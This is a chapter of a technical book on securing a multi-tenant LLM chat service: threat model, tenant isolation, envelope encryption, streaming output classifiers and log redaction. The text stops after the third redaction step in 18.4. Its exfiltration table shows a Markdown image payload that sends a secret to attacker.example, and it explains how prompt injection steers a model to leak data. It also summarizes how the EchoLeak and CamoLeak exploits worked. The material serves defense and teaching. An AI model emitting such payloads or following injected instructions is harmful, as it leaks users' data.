<!-- GENERATED from manuscript/src/part-18-security-privacy-safety.md by tools/render_manuscript.py. Edit the source, not this file. -->
# Part 18: Security, privacy and safety

Every boundary on your request's path has a control, each one checks the tenant ID, and no control works alone.

Earlier parts opened each control where your request met it. They are the edge checks (part 2.6) and the retrieval filter (part 5.4). Then come the credential broker (part 6.4), the egress service (part 7.4) and the injection layers (7.5). The last two are the sandbox (part 8.1) and the prefix-cache salt (part 13.5). This part puts them side by side in five steps:

1. What an attacker wants, and where an attacker can enter (18.1).
2. What the tenants share, and what stays separate (18.2).
3. How the system checks an answer while it streams (18.3).
4. What the logs keep, and what they never keep (18.4).
5. Which data must stay in one jurisdiction, and what that does to fallback and failover (18.5).

---

## 18.1 The threat model

A threat model lists the assets, the actors, the entry points on the path, and the control at each one.

### The assets

An **asset** is any data or artifact whose loss, change or disclosure harms a user, a tenant or the operator. Your request touches six kinds:

| Asset | Where it lives in this reference system | Why it matters |
|---|---|---|
| conversations and messages | the conversation store in the user's home region (RA-17) | they hold your text and the answers; a leak exposes the whole history |
| files | the S3-class object store (RA-21); parsed text, chunks and embeddings derived from them (RA-22, RA-23) | your Q3 report and your whiteboard photo are tenant data |
| tenant data in indexes and caches | the search engine (RA-24), the Redis-compatible caches (RA-19), the memory records (RA-27) | a wrong key or a missing filter returns one tenant's data to another |
| model weights | the model registry on the regional object store, the node NVMe cache and HBM (RA-61) | the operator's most expensive artifact; theft gives away the model |
| credentials | the vault behind the credential broker (RA-31), the service identities (RA-16), the KMS keys | a stolen credential acts with its owner's rights |
| KV cache | HBM blocks (G1) and the offload tiers G2 to G4 (RA-39) | KV blocks encode the prompt; a shared block or a timing difference can reveal it (part 13.5) |

The KV cache is easy to forget. It is not text, but it is a function of the text. So the system treats every KV block as tenant data in every tier: HBM, DRAM, NVMe and object store.

### The actors

| Actor | What the actor controls | Typical goal |
|---|---|---|
| outside attacker | packets from the internet, any URL, any HTTP request | take the service down, steal data, use GPUs for free |
| malicious user | a valid account, the request body, uploaded files, the user's own prompts | read another user's data, escape the sandbox, bypass a policy |
| other tenant | a valid account in another organization, timing measurements | learn this tenant's prompts or documents |
| compromised tool or web page | the text of a fetched page, a search result, a connector's answer | make the model act against the user (prompt injection), leak data |
| insider | an operator account, access to logs, dashboards or hosts | read conversations, copy weights or keys |

The second actor matters most for an AI service. A normal web service trusts its own code and checks only the user's input. Here the model's output is also untrusted input, because a malicious user or a web page can steer it.

### Trust boundaries along your request's path

A **trust boundary** is a point where data passes between components with different levels of trust. Every control in this part sits on one of them.

```mermaid
flowchart LR
  B([browser]):::client -->|sends TLS request| E[edge PoP]:::edge
  E -->|forwards over mTLS| G[API gateway]:::cpu
  G -->|passes verified tenant| O[orchestrator]:::cpu
  O -->|queries with tenant filter| R[(retrieval index)]:::store
  O -->|sends prompt with salt| M[model servers]:::gpu
  O -->|asks for a token| K[credential broker]:::cpu
  O -->|sends URLs| X[egress service]:::tools
  X -->|fetches untrusted pages| W([internet]):::other
  O -->|sends code| S[sandbox microVM]:::tools
  O -->|streams sanitized events| B
  classDef client fill:#e0f2fe,stroke:#7DD3FC,color:#111
  classDef edge fill:#e0f2fe,stroke:#38BDF8,color:#111
  classDef cpu fill:#ede9fe,stroke:#A78BFA,color:#111
  classDef gpu fill:#fce7f3,stroke:#F472B6,color:#111
  classDef store fill:#d1fae5,stroke:#34D399,color:#111
  classDef tools fill:#ffedd5,stroke:#FB923C,color:#111
  classDef other fill:#f3f4f6,stroke:#9ca3af,color:#111
```

Legend: light blue = client and edge; violet = CPU services; pink = GPU; green = stored state; orange = tools; grey = internet. The one thing to notice: untrusted text enters at the browser, the internet and the sandbox output. All three meet at the orchestrator. The diagram leaves out the stores behind the orchestrator on purpose; the next table lists them.

### Entry points and controls

Each row follows your request from the outside in. "Control" names the mechanism and the RA row that fixes it in this reference system.

| # | Entry point on your request's path | Threat | Main actor | Control | RA |
|---|---|---|---|---|---|
| 1 | the internet, at the anycast address | DDoS: packet floods, connection floods, HTTP floods | outside attacker | anycast spreads the load over many PoPs; the edge filters IP reputation, sizes and headers, then applies a coarse per-IP rate limit before any backend work (part 2.6) | RA-01, RA-04 |
| 2 | the client connection | eavesdropping, tampering, replay of early data | outside attacker | TLS 1.3 over QUIC or TCP; a chat `POST` in 0-RTT data gets `425 Too Early` | RA-02, RA-03 |
| 3 | the browser session | cross-site request forgery (CSRF) | outside attacker | a bearer token in the `Authorization` header, which a foreign site cannot attach (part 2.1) | RA-07 |
| 4 | the API gateway | forged or stolen token; unbounded consumption | outside attacker, malicious user | signature and expiry check; per-tenant RPM limit; per-pass TPM reservation that covers `max_tokens` and reasoning tokens | RA-09, RA-10, RA-60 |
| 5 | the request body | input validation: a malformed body, a foreign conversation ID or file ID | malicious user | schema validation at the gateway; every ID checked against the verified user and tenant before any read (part 3.8) | RA-14 |
| 6 | the stores | SQL injection | malicious user | parameterized statements only; user text is a bound value, never part of the statement text | (class B) |
| 7 | file uploads | malicious files: malware, a wrong MIME type, decompression bombs | malicious user | presigned PUT straight to object storage; scan, type and size checks at upload; parsing after upload, outside the request path | RA-08, RA-22 |
| 8 | retrieval | a cross-tenant result, a post-filter leak | other tenant, malicious user | tenant ID as a hard filter inside the index, ACL principals, a final check by chunk ID | RA-26 |
| 9 | chunks, pages and tool results in the context | prompt injection | compromised tool or web page | instruction hierarchy, tool allowlists, approval for side effects, structured data between steps | RA-32 |
| 10 | tool calls | tool abuse: a call outside the tenant's scope, too many calls, a side effect without consent | malicious user, compromised page | the orchestrator alone runs tools; schema validation, authorization, a per-user call bucket, human approval | RA-14, RA-32, RA-65 |
| 11 | page fetches | server-side request forgery (SSRF), DNS rebinding | malicious user, compromised page | the egress service resolves once, checks every address, pins the IP and checks every redirect (part 7.4) | RA-29 |
| 12 | the code sandbox | sandbox escape; exfiltration through the network | malicious user | a Firecracker microVM per session behind eight layers, no network interface, no credential inside (part 8.1) | RA-30, RA-69 |
| 13 | connectors | credential theft | compromised tool, insider | short-lived tokens from the broker; the model sees only a connection ID (part 6.4) | RA-31 |
| 14 | the inference engine | another tenant's KV blocks, a prefix-timing side channel | other tenant | `cache_salt` = tenant ID on every request with tenant content; per-sequence block tables in the kernels | RA-40, RA-43 |
| 15 | the rendered answer | cross-site scripting (XSS) from model output; exfiltration through a Markdown image URL | compromised page | no raw HTML, a sanitizer, a strict CSP with `img-src` limited to owned origins | RA-33 |
| 16 | service-to-service calls | a spoofed service, lateral movement after one compromise | outside attacker, insider | SPIFFE identities and mTLS; authorization on the SPIFFE ID; network policies | RA-16 |
| 17 | logs, traces and events | a copy of user text in a less protected store; baggage that reaches a third party | insider, compromised tool | structured records without message text, redaction, baggage dropped at trust boundaries (18.4) | RA-20, RA-52 |
| 18 | operator access | an insider reads data or copies weights | insider | least privilege, approved and audited access, encryption with keys in the KMS | (class B; 18.4) |

OWASP's list of LLM risks names several of these rows directly [SRC-184]:

- Prompt injection (LLM01).
- Sensitive information disclosure (LLM02).
- Improper output handling (LLM05).
- Excessive agency (LLM06).
- Unbounded consumption (LLM10).

Rows 9, 10 and 15 exist only because a model reads untrusted text and a browser renders its output.

### Encryption in transit and at rest, and the KMS

TLS or mTLS encrypts every hop on the path. TLS 1.3 protects the client hop (RA-02). mTLS protects every internal hop (RA-16). So a packet capture inside a data center shows only ciphertext.

Data at rest uses **envelope encryption**. A data key encrypts the data, and another key encrypts the data key [SRC-706]. The top key stays in a key management service (KMS). AWS states that its KMS keys "never leave" its hardware security modules unencrypted [SRC-706].

The steps for one stored object, such as your PDF:

1. The object store asks the KMS for a new data key under the tenant's key.
2. The KMS returns the data key twice: in plaintext and wrapped (encrypted) under the tenant's key.
3. The store encrypts the object with the plaintext data key, with AES-256-GCM.
4. The store writes the ciphertext and the wrapped data key side by side.
5. The store drops the plaintext data key from memory.
6. A later read sends the wrapped key to the KMS, gets the plaintext key back, and decrypts.

In this reference system, the key scope is one key-encryption key per tenant per region (hypothetical, RA-76). A service keeps an unwrapped data key in memory for at most 300 s. Two consequences follow:

- The KMS call rate stays bounded, because one unwrap serves many reads.
- Deleting a tenant's key makes every copy of that tenant's data unreadable, backups included. This is how a deletion reaches backups that the system cannot rewrite.

The same rule covers the KV blocks that leave HBM. G3 NVMe and G4 object-store tiers hold tenant KV at rest (RA-39), so they use the same envelope encryption.

### Service identity, mTLS and least privilege

Every workload has a SPIFFE ID, a URI of the form `spiffe://<trust domain>/<workload identifier>` [SRC-188]. The workload API hands each workload a short-lived X.509 certificate for that ID, and rotates it automatically [SRC-188]. In this reference system, services authenticate each other with mTLS and authorize on the caller's SPIFFE ID (RA-16).

An example authorization rule for the credential broker:

| Caller SPIFFE ID (example) | May call | Why |
|---|---|---|
| `spiffe://ap-south.chat.example/tool-executor` | `IssueToken` for one connection ID | the executor runs the connector call (part 6.4) |
| `spiffe://ap-south.chat.example/orchestrator` | nothing on the broker | the orchestrator never needs a token |
| `spiffe://ap-south.chat.example/sandbox-host` | nothing on the broker | the sandbox holds no credentials (RA-30) |

**Least privilege** means that each identity holds only the rights that its task needs. The table shows it: the orchestrator decides which tool runs, but it cannot get a token. So a bug in the orchestrator cannot turn into a credential leak.

Network policies add a second, independent check at layer 3 and 4. Kubernetes pods accept all traffic by default. A NetworkPolicy that selects a pod isolates it, and then only the listed traffic may pass [SRC-707]. Policies only allow; they never deny, and a network plugin must enforce them [SRC-707]. A common design gives every namespace a policy that allows nothing, then adds one allow rule per call path. Then a compromised pod with a stolen certificate still cannot open a connection that the call graph does not contain.

### Input validation and the classic web attacks

The classic attacks still apply, and each has a fixed place:

- **Input validation.** The gateway validates the body against a schema: types, lengths, enums and size limits. The gateway rejects a field outside the schema; it does not ignore it (part 3.1).
- **SQL injection.** The services build statements with bound parameters. Your text reaches the database as a value. So no character in it can change the statement.
- **CSRF.** The bearer token in a header defeats it for the chat API (RA-07). Any cookie that remains keeps an OWASP defense [SRC-173].
- **XSS.** The renderer escapes raw HTML in model output and runs a sanitizer. The CSP blocks inline script (RA-33, part 15.5).
- **SSRF.** Only the egress service fetches URLs, and it checks every resolved address (RA-29, part 7.4).

### Exfiltration channels

**Exfiltration** is data that leaves through a channel the user did not intend. Prompt injection makes it possible, because the model can be told to write data into any output it controls. Every output of the model is therefore a channel:

| Channel | Example | Control | RA |
|---|---|---|---|
| a Markdown image | `![p](https://attacker.example/p.png?d=<secret>)`; the browser fetches it with no click | sanitizer removes non-owned image URLs; CSP `img-src` | RA-33 |
| a link | a link whose URL carries data | links come only from `citation` and `artifact` events; the client shows the full URL; a link needs a click | RA-33, RA-67 |
| a tool argument | a search query that carries document text to the provider | per-argument length limits; the egress service fetches only provider results | RA-29, RA-32 |
| code output | code that prints secrets into the result | no credential and no network in the VM; the result is untrusted text again | RA-30 |
| a side-effecting tool | "send this table by email" | human approval with the full arguments | RA-32 |
| logs and traces | a debug record with the prompt | structured records without text; redaction (18.4) | RA-52 |
| timing | TTFT reveals a cached prefix | tenant salt on the prefix cache | RA-40 |

Public reports show the image channel in production assistants. EchoLeak (CVE-2025-32711) passed a redaction filter with a reference-style Markdown link [SRC-186]. CamoLeak encoded data in the order of requests to pre-signed proxy URLs, one per character [SRC-370]. So this reference system relies on the sanitizer and the CSP together (RA-33). It does not rely on a proxy alone (part 7.5).

**Meanwhile in the fleet.** At peak, about 50,000 requests/s arrive (hypothetical). The edge drops flood traffic before TLS work where it can, and before any backend work in every case. The gateway rejects expired tokens with `401` from local signature checks, with no network call. The sandbox fleet restores fresh microVMs; no VM ever runs code from two sessions.

You can now name the threat, the actor and the control at each entry point on your request's path.

---

## 18.2 Multi-tenancy: shared weights, isolated state

Tenants share hardware and read-only weights, while all request and tenant state carries a tenant ID that each component checks.

### What is shared and what is isolated

| Shared across tenants | Isolated per tenant |
|---|---|
| CPUs of the API, orchestrator and retrieval tiers | conversations and messages |
| GPUs, and the batch of one engine step | KV cache blocks, in every tier |
| the model weights in HBM | files, parsed text, chunks and embeddings |
| accelerators of the retrieval pool | retrieval index partitions and their caches |
| the search cluster's processes | secrets and connector tokens |
| static assets on the CDN | logs and audit events, by tenant field and access scope |

The left column holds no tenant data, or holds it only for the duration of one computation. The right column holds tenant data that outlives one request.

### Shared weights, precisely

Weights are read-only common parameters. The per-request context is request-specific state. The two have different owners, sizes and lifetimes.

A common design loads the weights once at startup and only reads them during serving. Every request in a batch multiplies its own activations by the same weight matrices. A request can therefore not change what another request computes through the weights.

The sizes for `M-frontier`, for your request at the end of pass 3:

```
MLA latent    = context tokens × MLA bytes per token = 31,258 × 27,648 = 864,221,184 B
KDA state     = 449,372,160 B, fixed per sequence
request state = 864,221,184 + 449,372,160 = 1,313,593,344 B ≈ 1.31 GB (BF16 latent)
weights       = 1,560,936,091,448 B ≈ 1,561 GB
ratio         = 1,188
```

The context of 31,258 tokens comes from part 5.6. The weights are about 1,188 times larger than your request's state. That ratio is the reason to share them. One copy of the weights per replica serves every tenant, and only the small per-request state needs isolation.

**Inside one engine step.** Tokens from several tenants run in the same batch on the same GPU. Two mechanisms keep their attention apart (RA-43):

1. `cu_seqlens` marks where each sequence starts and ends in the flattened token array, so attention never crosses a sequence boundary [vllm@v0.31.0:vllm/v1/attention/backends/flash_attn.py#L1450-L1474] [flash-attention@94e22c9:csrc/flash_attn/src/block_info.h#L16-L36].
2. The block table of a sequence lists only its own KV blocks [vllm@v0.31.0:vllm/v1/attention/backend.py#L389-L420]. So the kernel reads no other blocks (part 13.2).

Batch composition can still change the last bits of a result; vLLM's batch-invariant mode exists to remove that effect [SRC-041]. Batch-invariant mode is off in this reference system, so logits can depend on the batch (RA-44). No content crosses this way, but outputs are not bit-reproducible.

### Where your tenant ID is enforced

The gateway derives the tenant ID from the verified token (part 3.4). From then on, every component takes it from the verified identity, never from the request body or from model output. The components that enforce it, in path order:

| Point | Where the tenant ID comes from | What is checked | What a missing check would leak | RA |
|---|---|---|---|---|
| edge PoP | not known yet | only IP-level limits; the edge does not verify tokens | nothing tenant-specific: the edge holds no tenant data | RA-04 |
| API gateway | the verified token → user → tenant | signature and expiry; per-tenant RPM limit and entitlements | one tenant's quota spent by another | RA-09, RA-10 |
| model router | the gateway's verified headers | per-tenant TPM reservation; the fairness header set from the verified tenant | one tenant's GPU share taken by another | RA-10, RA-71 |
| orchestrator | the verified identity | the conversation ID and both file IDs belong to this user and tenant | another user's conversation or file | RA-14 |
| conversation store | the request's tenant and user | every key starts with the tenant; every query carries a tenant predicate | another tenant's messages | RA-17 |
| retrieval | the verified identity | tenant hard filter inside the index; ACL principals; final check by chunk ID | another tenant's chunks | RA-26 |
| derived caches | the verified identity | the tenant ID is part of every key | another tenant's embeddings, results or pages | RA-19 |
| prefix KV cache | the verified identity | `cache_salt` = tenant ID, mixed into block 0 | another tenant's KV blocks, and the timing signal | RA-40 |
| sandbox | the session of this conversation | one microVM per session; files under the session's prefix; no reuse across sessions | another session's files or variables | RA-30, RA-69 |
| credential broker | the executor's mTLS identity and the call's connection ID | the connection belongs to this tenant and user | another tenant's connector token | RA-31 |
| object store and KMS | the stored object's tenant | short-lived presigned URLs for one object; the tenant's own KMS key | another tenant's files | RA-08, RA-63 |
| events and logs | the producer's verified context | a `tenant_id` field on every record; audit events keyed by tenant; access scoped by tenant | another tenant's audit trail | RA-20, RA-73 |

**The salt at work.** The prefix-cache demo of part 13.5 hashes the same token IDs under two salts. With one salt, both requests start with blocks f4fecb2a, 23383c17, f3e9c1c2 and share 261 blocks. With two salts, the second request starts with 0eb45532, 3b92014f, 1a546ef1 and shares 0. The salt sits in block 0, so it covers the whole request (RA-40).

### Shared on purpose, and why it is safe

| Shared component | Why sharing is safe | What remains |
|---|---|---|
| model weights in HBM | read-only during serving; identical for every tenant | none for content; the weights themselves are an operator asset (18.1, row 18) |
| GPU batch | per-sequence `cu_seqlens` and block tables (RA-43) | batch-dependent numerics (RA-44); no content |
| sandbox hosts | each session gets its own microVM behind the layers of part 8.1 | hardware side channels between VMs on one host; gVisor's guide lists Spectre-style side channels as outside its protection too [SRC-177] |
| the search engine's processes | the tenant filter runs inside the traversal (RA-26) | a query that omits the filter; so the retrieval client adds it, not the caller |
| the tokenizer cache | it holds token IDs of fixed operator text only | none |
| the CDN cache | it holds static assets, the same for every user | none |
| queues and admission | fairness by least attained service per tenant (RA-71) | queue time depends on other tenants' load; this is a timing signal of load, not of content |

Two signals still cross tenants on purpose: shared queues and shared GPUs make latency depend on total load. The 2024 study of serving systems shows that timing can leak content when a cache is shared [SRC-206]. So the rule is narrow: a shared component may change how fast an answer comes, but never what it contains. The salt removes the one cache whose hit depends on another tenant's content.

**Meanwhile in the fleet.** In one decode step on one `M-frontier` replica, the batch holds sequences from many tenants. Each sequence appends one token's KV to its own blocks. Other replicas read the same weight files from their own HBM. A new tenant signs up, and no GPU state changes. Its first request only carries a new salt.

You can now explain why tenants can share the weights, and list every check of your tenant ID.

---

## 18.3 Safety during output streaming

The output check reads windows of streamed tokens: a held window costs latency, and an early release costs exposure.

### Five approaches

Five approaches exist. They differ in where they run, what they cost and what they can see:

| Approach | Where it runs | What it can catch | Cost on the stream |
|---|---|---|---|
| model alignment | inside the weights, from training | most harmful requests, before any token | none at serving time |
| token-level controls | the engine's sampler | fixed token sequences, a fixed vocabulary, stop strings | almost none |
| incremental classifiers | a classifier that scores the output so far, at every token or window | harmful content as it forms | classifier compute; a stop decision per token or window |
| chunk buffering | the server holds text until a check of the chunk passes | anything the classifier sees in one chunk | the hold-back delay |
| post-generation filters | a check of the complete answer | anything in the whole answer | the whole generation time, so it suits stored outputs, not a live stream |

**Token-level controls in vLLM.** A request can carry `bad_words` [vllm@v0.31.0:vllm/sampling_params.py#L353-L357]. The engine then forbids the token that would complete a listed sequence. `logit_bias` and `allowed_token_ids` add a logits processor [vllm@v0.31.0:vllm/sampling_params.py#L343-L349]. Stop strings already force a small hold-back [vllm@v0.31.0:vllm/sampling_params.py#L532-L535]. The engine keeps the last characters until they cannot start a stop string. 

These controls match text, not meaning. So they cannot replace a classifier.

**Incremental classifiers.** Anthropic's Constitutional Classifiers paper describes an output classifier that scores the full output at each token [SRC-702]. A linear value head on a fine-tuned language model produces the score [SRC-702]. If a token's score passes a threshold, the system blocks the output and stops streaming [SRC-702]. The paper notes that a stop is final: once streaming stops, the user never sees the rest of the answer [SRC-702]. It reports a 23.7% inference overhead for its classifiers [SRC-702].

**Chunk buffering.** Azure OpenAI's default streaming mode buffers the output and runs its content filter on the buffer [SRC-700]. It returns the text in "content chunks" of the buffer size [SRC-700]. NVIDIA's NeMo Guardrails checks chunks of 200 tokens by default [SRC-701]. Each check re-reads 50 tokens of the previous chunk [SRC-701]. Its `stream_first` setting, true by default, sends tokens before the check runs [SRC-701].

### The input check, in parallel

Part 3.8 opened the input side. In this reference system, the policy classifier reads your text in parallel with history, retrieval and tool selection. Pass 1 waits for its verdict (RA-58). The added time is the maximum of the parallel branches, not the sum (part 3.8):

```
T_before_first_pass = T_synchronous_checks + max(T_history, T_retrieval, T_classifier, T_tool_selection) + T_context_assembly
```

Each later pass adds new untrusted text. Pass 2 adds search results and page text; pass 3 adds the code result. The orchestrator screens each tool result before it enters the context (part 7.5). The output check below covers the other direction: text that the model writes and the client would see.

### The output check on your answer

This part is not public. Two realistic options exist:

- **Hold-back.** The server releases a window only after its check passes.
- **Stream-first.** The server sends tokens at once, and stops or retracts them later.

Here we use hold-back, with these values (hypothetical, `stream_safety_ref`, RA-75):

| Setting | Value |
|---|---|
| window | 16 new tokens per check |
| overlap | the last 8 tokens of the previous window, read again |
| check latency | 20 ms per check |
| classifier size | 1,123,000,000 parameters, the size of the public Llama Guard 3 1B [SRC-703] |

Llama Guard 3 is a public example of such a classifier. It classifies both prompts and responses, over 13 hazard categories [SRC-703]. Which classifier any real assistant runs is not public.

The loop in the orchestrator, for each text segment of the visible answer:

1. The orchestrator appends each `output_text` delta from the model server to a hold-back buffer.
2. A window closes at 16 new tokens, or when its segment ends (a tool call or the message end).
3. The orchestrator sends the closed window, plus the overlap, to the classifier pool over gRPC.
4. The model server keeps decoding meanwhile; new tokens fill the next window.
5. A pass verdict releases the window: the orchestrator writes its deltas into the SSE stream.
6. A fail verdict stops the stream (see "When a check fails mid-stream").

The overlap exists because a harmful phrase can start in one window and end in the next. With the overlap, the check of window k sees the end of window k − 1 too.

The check reads only text that the client would see. The raw reasoning never reaches the client (RA-72). The parser already holds tool-call text (RA-50, part 15.3). The orchestrator holds citation markers for their own check (part 15.3). So a marker joins a window only after it resolves.

```mermaid
sequenceDiagram
  participant MS as model server
  participant OR as orchestrator buffer
  participant CL as output classifier
  participant BR as browser
  MS->>OR: sends the tokens of window 1
  OR->>CL: sends window 1
  MS->>OR: sends the tokens of window 2
  CL-->>OR: returns pass for window 1
  OR->>BR: streams the tokens of window 1
  OR->>CL: sends window 2 with 8 overlap tokens
  CL-->>OR: returns pass for window 2
  OR->>BR: streams the tokens of window 2
```

Legend: solid arrows = requests and data; dashed arrows = verdicts. The one thing to notice: decode never waits for the classifier. So the check delays only the release. The diagram leaves out the SSE framing and the citation hold-back on purpose (part 15).

### The hold-back delay, worked

The answer streams one token per decode step, about 21 tokens/s per user. In the decode model of part 14.2, this time per output token (TPOT) is 47.2 ms (hypothetical). Let token 1 of a segment arrive at t = 0. Token W arrives at (W − 1) × TPOT. The check then takes C ms. So the first visible token of the segment waits:

```
added delay = (W − 1) × TPOT + C
            = (16 − 1) × 47.238 + 20 = 729 ms
```

After the first window, every token waits the same time. Each window releases C ms after its last token arrives. So the visible text lags the model by a fixed 729 ms. The release still looks smooth, because the orchestrator writes a released window as its separate deltas.

This delay lands on first visible text, not on TTFT. TTFT stops when the first stream event reaches the client (part 0.1). For a reasoning pass, that event is the reasoning status, and the window holds only answer text. The delay adds to TTFT only when answer text is the first event, as in a request without reasoning.

For your answer of 450 visible tokens, each window size gives:

| Window W (tokens) | Added delay (ms) | Delay ÷ the 1,500 ms p95 TTFT target | Checks per answer | Classifier tokens per answer | Extra tokens read | Exposed tokens with stream-first |
|---|---|---|---|---|---|---|
| 8 | 351 | 23% | 57 | 898 | 100% | 8 |
| **16** (reference) | 729 | 49% | 29 | 674 | 50% | 16 |
| 32 | 1,484 | 99% | 15 | 562 | 25% | 32 |
| 64 | 2,996 | 200% | 8 | 506 | 12% | 64 |
| 128 | 6,019 | 401% | 4 | 474 | 5% | 128 |
| 256 | 12,066 | 804% | 2 | 458 | 2% | 256 |

The columns, step by step:

1. **Checks per answer** = ceil(visible tokens ÷ W). For W = 16: ceil(450 ÷ 16) = 29.
2. **Classifier tokens** = every new token once, plus the overlap of each window after the first.
3. **Exposed tokens with stream-first** = W + floor(C ÷ TPOT). The violating token can open a window. Then W − 1 more tokens arrive before the window closes. During the check, floor(C ÷ TPOT) = floor(20 ÷ 47.2) = 0 more arrive. For W = 16: 16 + 0 = 16.
4. With hold-back, the exposed count is 0 for every W, because a failing window is never released.

### What the window size changes

The table turns one parameter into three costs:

- **Small windows** cut the delay but multiply the checks. At W = 8, the overlap makes the classifier read 100% more tokens than the answer has.
- **Large windows** read few extra tokens but delay the text. At W = 64, the added delay of 2,996 ms is longer than the whole p95 TTFT target. If answer text is the first event, that delay alone breaks the target.
- **The reference window** adds 729 ms, which equals 49% of the TTFT target, for 50% extra classifier reads.

The delay grows with TPOT. A slower stream makes each window take longer to fill. So a deployment with a lower decode speed needs a smaller W for the same delay.

**Your request's first visible text.** Pass 1 writes a preamble of 9 tokens before its `web_search` call (part 15.3). The segment ends when the call starts, so the window closes early. The added delay is `9 × 47.238 + 20 = 445` ms, not 729 ms. The pass-3 answer then pays the full window delay once, and none after.

**Public examples.** Azure's Asynchronous Filter mode is a stream-first design: it returns tokens immediately, with "zero latency associated with content filtering" [SRC-700]. Its policy signal is "guaranteed within a ~1,000-character window" of the violating content [SRC-700]. At about 4 characters per English token (a hypothetical rule of thumb, `storage_ref`), that is about 250 tokens. At a TPOT of 47.2 ms, that is 11.8 s of text. NeMo Guardrails documents both orders: smaller chunks with `stream_first` for lower latency, and `stream_first: false` with larger chunks for maximum safety [SRC-701].

### When a check fails mid-stream

Suppose window 7 of your answer fails its check. This failure is illustrative; your reference answer passes. Window 7 holds tokens 97 to 112. With W = 16:

1. The client has received windows 1 to 6: (7 − 1) × 16 = 96 tokens.
2. The verdict arrives at `(7 × 16 − 1) × 47.238 + 20 = 5,263` ms after the first answer token.
3. By then the engine has produced 7 × 16 + floor(20 ÷ 47.2) = 112 tokens.
4. The orchestrator discards the 16 held tokens. They never reach the client.
5. The orchestrator cancels the sequence. The scheduler frees its KV blocks at the next step (RA-49), and the engine skips the remaining 338 tokens.
6. The orchestrator sends an `error` event with the reason `content_policy`, then closes the stream.
7. The orchestrator writes the partial assistant message with the 96 released tokens, status `interrupted` and the same reason (RA-59).
8. The model router settles the pass once, for the tokens that the engine produced, and emits one usage event (RA-73).

The partial message holds only the released text. So the stored history matches what the user saw, and the next turn's context contains no blocked text.

With stream-first, the same failure ends differently. The 16 tokens of window 7 and the check time are already on the screen. The client must remove them on the `error` event. Azure tells users of its asynchronous mode to "implement client-side content redaction" for this case [SRC-700]. A retraction cannot undo what the user already read, and a modified client can ignore it. That is the exposure cost.

Billing follows the generated tokens, not the shown ones. Azure documents the same rule for a stream that ends with `finish_reason: "content_filter"` [SRC-700]. It charges the prompt and every output token generated before the filter [SRC-700].

### The fleet cost of the output check

At the fleet's hypothetical 20,000,000 output tokens/s (part 14), the output check needs:

```
checks/s            = tokens/s ÷ W                        = 20,000,000 ÷ 16 = 1,250,000
classifier tokens/s = tokens/s × (W + overlap) ÷ W         = 20,000,000 × (16 + 8) ÷ 16 = 30,000,000
FLOP/s              = 2 × parameters × classifier tokens/s = 2 × 1,123,000,000 × 30,000,000 = 6.738e+16
H100 equivalents    = FLOP/s ÷ (BF16 dense peak × MFU)     = 6.738e+16 ÷ (9.8950e+14 × 0.5) = 136.2
```

The token rate counts all output tokens, including reasoning, so it is an upper bound. The MFU of 0.5 is the prefill assumption of part 13 (hypothetical). A classifier reads its window in one prefill-like forward pass, so the same assumption fits.

Per streamed token, the classifier costs about 1.6% of the FLOPs that `M-frontier` spends to produce the token. So the output check is cheap in compute. Its real costs are the hold-back delay and the classifier pool as one more dependency on the stream path. With hold-back, a classifier outage must fail closed, because the orchestrator may not release an unchecked window. So the classifier pool needs its own capacity margin. Its circuit breaker stops new streams; it never skips checks (RA-13).

**Meanwhile in the fleet.** About 1,250 thousand window checks per second reach the classifier pools at the hypothetical peak. The pools batch them like any prefill, because each check is a short prompt with no decode. Almost every verdict is a pass, so almost every window releases 20 ms after it closes.

Counters at this moment (illustrative):

- `vllm:num_requests_running` on the classifier pool: many short requests, each one forward pass long [vllm@v0.31.0:vllm/v1/metrics/loggers.py#L462-L927].
- held tokens in your stream's buffer: at most 16 plus the tokens that arrive during one check.

You can now compute the delay, the classifier load and the exposure of an output check for a window size.

---

## 18.4 Privacy of logs

Logs, traces and events keep identifiers, sizes and timings, never message text, and redaction runs before storage.

### What each component logs for your request

In this reference system, every log record is a JSON object with a fixed schema per event (hypothetical, RA-77). Your request leaves these INFO-level records:

| Component | Records | What the record holds | What it never holds |
|---|---|---|---|
| edge PoP | 1 | client network (/24), PoP, protocol, status, bytes, duration, `request_id` | the token, the body |
| API gateway | 1 | tenant ID, pseudonymous user, route, limit decision, status | the token, the body |
| orchestrator | 4 | stage timings, context token counts, tool decisions, policy verdict codes | your text, chunk text, tool arguments |
| retrieval | 1 | candidate counts, chunk IDs, timings | the query text, chunk text |
| model router | 3 (one per pass) | deployment, prompt and output token counts, cached tokens, TTFT, finish reason | prompts, outputs, reasoning |
| tool executor | 2 (one per call) | tool name, connection ID, duration, result size, status | arguments, results, tokens |
| egress service | 3 (one per page) | host name, resolved address class, status, bytes, content type | the full URL query string, the page text |
| sandbox host | 1 | VM ID, restore time, CPU and memory peaks, exit status | the code, stdout, files |

In total: 1 + 1 + 4 + 1 + 3 + 2 + 3 + 1 = 16 records. At 350 B each, that is `16 × 350 = 5,600` B per request. The events of part 16.2 follow the same rule: usage, audit and analytics events carry no text (RA-20).

A record still says a lot. A `tenant_id`, a pseudonymous user and a timestamp show who used the service and when. So these records are personal data too, and the access and retention rules below apply to them.

### Why message text stays out of logs

OWASP's logging guidance lists data that logs should usually not hold directly [SRC-704]:

- Session identifiers.
- Access tokens and passwords.
- Encryption keys and other primary secrets.
- Sensitive personal data and some personally identifiable information (PII).

The guidance says to remove, mask, sanitize, hash or encrypt such data instead [SRC-704].

Volume is a second reason. With text, every request would add at least its prompt and its answer:

```
text bytes per request = (mean prompt + mean output tokens) × B per token
                       = (3,000 + 400) × 4 = 13,600 B
text bytes per day     = 13,600 × 3,000,000,000 = 4.080e+13 B ≈ 40.8 TB
structured bytes/day   = 5,600 × 3,000,000,000 = 1.680e+13 B ≈ 16.8 TB
```

The traffic values are hypothetical (part 1). The text line is a lower bound, because it counts each prompt once. Your request shows why: its three passes send 83,533 prompt tokens (part 5.6). Logged once per pass, that is `83,533 × 4 = 334,132` B. That is 60 times the 5,600 B of structured records.

The third reason is copies. The conversation store keeps your text under access checks, deletion and residency rules (part 16.1, 18.5). A copy in a log escapes all three. When you delete the conversation, the store deletes the rows, but a log line in a search cluster stays.

### Redaction before storage

In this reference system (RA-77), each service's logging library redacts a record before it leaves the process (part 3.8). A collector runs the same scrub again before storage. The steps for one record:

1. **Schema allowlist.** The library writes only the fields that the event's schema lists. The schema marks each free-text field, so the library knows every one.
2. **Transform identifiers.** The user ID becomes a keyed pseudonym: HMAC-SHA256 with a key from the KMS, truncated. The client IP becomes its /24 network. Your text becomes its length only.
3. **Scrub free text.** Patterns replace bearer tokens, JWTs, secret keys, email addresses, card numbers that pass the Luhn check, and phone numbers.
